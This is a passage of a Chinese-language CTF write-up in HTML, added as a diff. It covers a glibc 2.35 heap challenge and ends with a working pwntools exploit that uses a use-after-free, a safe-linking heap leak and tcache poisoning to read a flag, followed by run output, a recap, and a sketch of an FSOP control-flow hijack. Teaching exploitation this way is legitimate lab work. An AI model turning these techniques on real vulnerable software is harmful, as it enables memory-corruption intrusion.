+    io.sendlineafter(<span class="s">b'&gt; '</span>, <span class="s">b'4'</span>); io.sendlineafter(<span class="s">b'Index: '</span>, str(i).encode())
+    io.sendlineafter(<span class="s">b'Offset: '</span>, str(off).encode())
+    io.sendlineafter(<span class="s">b'Length: '</span>, str(n).encode())
+    b = io.recvuntil(<span class="s">b'1) malloc'</span>).split(<span class="s">b'1) malloc'</span>)[0]
+    <span class="k">return</span> b<span class="s">''</span>.join(bytes.fromhex(h.decode()) <span class="k">for</span> h <span class="k">in</span> re.findall(<span class="s">rb'[0-9a-f]{2}'</span>, b))[:n]
+
+SZ = <span class="s">0x100</span>
+add(<span class="s">0</span>, SZ); add(<span class="s">1</span>, SZ)      <span class="c"># A, B(同一個 page)</span>
+free(<span class="s">0</span>); free(<span class="s">1</span>)            <span class="c"># bin: B -&gt; A,counts = 2</span>
+
+fdA = u64(show(<span class="s">0</span>, <span class="s">0</span>, <span class="s">8</span>))   <span class="c"># A&gt;&gt;12</span>
+fdB = u64(show(<span class="s">1</span>, <span class="s">0</span>, <span class="s">8</span>))   <span class="c"># (B&gt;&gt;12) ^ A</span>
+heap = fdA &lt;&lt; <span class="s">12</span>           <span class="c"># heap base</span>
+
+T = heap + <span class="s">0x290</span>            <span class="c"># 假 chunk,user data = flag − 0x10</span>
+edit(<span class="s">1</span>, <span class="s">0</span>, p64(T ^ (heap &gt;&gt; <span class="s">12</span>)))   <span class="c"># 毒化 B.next</span>
+add(<span class="s">2</span>, SZ)                  <span class="c"># pop B</span>
+add(<span class="s">3</span>, SZ)                  <span class="c"># pop T → heap+0x290</span>
+
+flag = show(<span class="s">3</span>, <span class="s">0x10</span>, <span class="s">0x80</span>)   <span class="c"># T+0x10 = flag</span>
+print(<span class="s">'FLAG ='</span>, re.search(<span class="s">rb'flag\{[^}]*\}'</span>, flag).group().decode())
+io.close()</pre></div>
+
+      <h3>執行結果</h3>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>output</span></div>
+<pre>$ echo 'flag{th1s_1s_a_r34l_fl4g_0n_h34p}' &gt; flag.txt
+$ python3 exp.py
+[*] A&gt;&gt;12  = 0x563d018a7
+[*] A_full = 0x563d018a7510   -&gt; heap+0x510
+[*] heap   = 0x563d018a7000
+[+] leak: b'flag{th1s_1s_a_r34l_fl4g_0n_h34p}\n\x00\x00\x00\x00'
+FLAG = flag{th1s_1s_a_r34l_fl4g_0n_h34p}</pre></div>
+      <p>沒有 <code>flag.txt</code> 時會讀到程式內建的佔位字串 <code>flag{missing_flag_txt}</code>,這正好證明我們讀的確實是 setup 放進 heap 的那個緩衝區。</p>
+    </section>
+
+    <section id="s8">
+      <div class="sec-head"><span class="sec-num">§8</span></div>
+      <h2>重點回顧</h2>
+      <ol>
+        <li><strong>漏洞是 UAF,不是 overflow。</strong><code>free</code> 不清指標、<code>edit</code>/<code>show</code> 不擋已釋放的 chunk;那顆 <code>freed</code> 旗標只是把下界放寬到 -16 而已。</li>
+        <li><strong>先看資料,再想招。</strong>flag 早在 <code>setup</code> 就進了 heap,所以這題只要「任意讀」,完全不用碰 FSOP / house of water。</li>
+        <li><strong>2.34+ 的兩個變化要記牢:</strong>tcache 的 <code>key</code> 被隨機化(別再靠它 leak),以及 hooks 被移除(傳統蓋 <code>__free_hook</code> 拿 shell 已死)。</li>
+        <li><strong>safe-linking 也能當 leak 用:</strong>free 進空 bin 的節點,<code>next</code> 就是自己的 <code>位址 &gt;&gt; 12</code>;配上 page 對齊就能還原 heap。</li>
+        <li><strong>打 heap 前先 gdb 畫佈局。</strong><code>heap+0x2a0</code>、<code>heap+0x510</code> 這種偏移都是看來的,不是猜的。</li>
+      </ol>
+      <div class="note"><span class="lbl">延伸</span><p>如果這題沒有現成的 flag、必須拿 shell,才會輪到真正的 <em>house of water</em>:用 tcache / unsorted 任意寫,去偽造 <code>_IO_FILE</code> 的 <code>_wide_data</code> 並把 vtable 指向 <code>_IO_wfile_jumps</code> 附近,在 <code>exit</code> 的 flush 流程中劫持控制流。那條路才是題名的本體。</p></div>
+    </section>
+  </article>
+
+  <aside class="rail" aria-label="目錄">
+    <p class="lbl">內容</p>
+    <ol>
+      <li><a href="#tldr"><span class="n">00</span>一句話版本</a></li>
+      <li><a href="#s0"><span class="n">01</span>環境坑</a></li>
+      <li><a href="#s1"><span class="n">02</span>偵查</a></li>
+      <li><a href="#s2"><span class="n">03</span>程式邏輯</a></li>
+      <li><a href="#s3"><span class="n">04</span>UAF 漏洞</a></li>
+      <li><a href="#s4"><span class="n">05</span>heap 佈局</a></li>
+      <li><a href="#s5"><span class="n">06</span>洩漏 heap</a></li>
+      <li><a href="#s6"><span class="n">07</span>tcache poisoning</a></li>
+      <li><a href="#s7"><span class="n">08</span>完整 exploit</a></li>
+      <li><a href="#s8"><span class="n">09</span>重點回顧</a></li>
+    </ol>
+    <p class="foot">chal · libc 2.35-0ubuntu3.15<br>PIE · Full RELRO · NX · Canary</p>
+  </aside>
+
+  <footer>教學 WP · tcache poisoning via heap UAF · 本地以 glibc 2.35 驗證</footer>
+</div>
